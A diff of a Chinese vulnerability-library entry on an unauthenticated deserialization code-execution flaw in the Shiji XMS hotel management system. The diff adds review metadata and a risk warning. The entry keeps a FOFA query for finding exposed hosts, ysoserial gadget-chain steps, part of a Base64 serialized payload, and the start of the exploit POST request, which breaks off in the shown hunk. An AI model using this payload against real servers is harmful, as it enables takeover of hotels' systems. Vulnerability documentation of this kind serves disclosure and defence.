@@ -1,22 +1,62 @@
 ---
-
 source: "wy876 漏洞文库"
+title: "西软云XMS FoxLookupInvoker反序列化"
+product: "西软云XMS"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "CommonsBeanutils183NOCC/Tomcat回显/JDK依赖未列"
+prerequisites: "声称未认证"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/hovuc44zuuowa3gd"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E8%A5%BF%E8%BD%AF%E4%BA%91XMS/%E8%A5%BF%E8%BD%AF%E4%BA%91XMSFoxLookupInvoker%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md"
+fofa: "app=\"shiji-西软云XMS\""
+id: "vw-149343ef8ffcf937b28d6af1"
+entity_id: "ve-149343ef8ffcf937b28d6af1"
+schema_version: "1"
 ---
 
-# 西软云XMS FoxLookupInvoker接口存在反序列化漏洞
+# 西软云XMS FoxLookupInvoker反序列化
 
-# 一、漏洞简介
-西软云XMS是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。致力于以新一代云架构为国内四，五星级中高端酒店提供灵活、高度整合酒店业务，助力酒店智能转型升级。2020的开年突变，对酒店行业来讲，无疑是天降横祸。覆巢之下，焉有完卵，对酒店管理系统企业来说，则是增量市场的红利几乎消失，所有品牌都得在存量市场里搏杀，生存和创新，是2020年的头号命题。<font style="color:rgba(0, 0, 0, 0.9);">西软云XMS /fox-invoker/FoxLookupInvoker接口处存在反序列化漏洞，未经身份认证的攻击者可利用此漏洞执行任意代码，获取服务器权限。</font>
+## 条目说明
 
-# 二、影响版本
+- 对象与具体问题：西软云XMS；FoxLookupInvoker反序列化
+- 版本、配置及部署条件：CommonsBeanutils183NOCC/Tomcat回显/JDK依赖未列
+- 认证与权限前提：声称未认证
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 全文两段Base64序列化字节已读为不透明载荷，未反编译或执行；两段动态类名不同不能默认相同校验
+- base64dec工具宏需工具/版本说明，Jar仅语雀附件无固定源码/校验
+- 缺服务端根因、具体产品版/安全版和响应文字；大段2020行业营销噪声
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 一、漏洞简介
+西软云XMS是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。致力于以新一代云架构为国内四，五星级中高端酒店提供灵活、高度整合酒店业务，助力酒店智能转型升级。2020的开年突变，对酒店行业来讲，无疑是天降横祸。覆巢之下，焉有完卵，对酒店管理系统企业来说，则是增量市场的红利几乎消失，所有品牌都得在存量市场里搏杀，生存和创新，是2020年的头号命题。西软云XMS /fox-invoker/FoxLookupInvoker接口处存在反序列化漏洞，未经身份认证的攻击者可利用此漏洞执行任意代码，获取服务器权限。
+
+## 二、影响版本
 + 西软云XMS
 
-# 三、资产测绘
+## 三、资产测绘
 + fofa`app="shiji-西软云XMS"`
 + 特征
 
 
-# 四、漏洞复现
+## 四、漏洞复现
 1. 生成`CommonsBeanutils183NOCC`回显链
 
 [ysoserial-0.0.6-SNAPSHOT-all.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1713623246544-1ecb25a1-5dcc-450d-9ea1-067408bc9cc8.jar)
@@ -31,7 +71,7 @@ rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0
 
 2. poc
 
-```plain
+```http
 POST /fox-invoker/FoxLookupInvoker/?return-exception=true HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
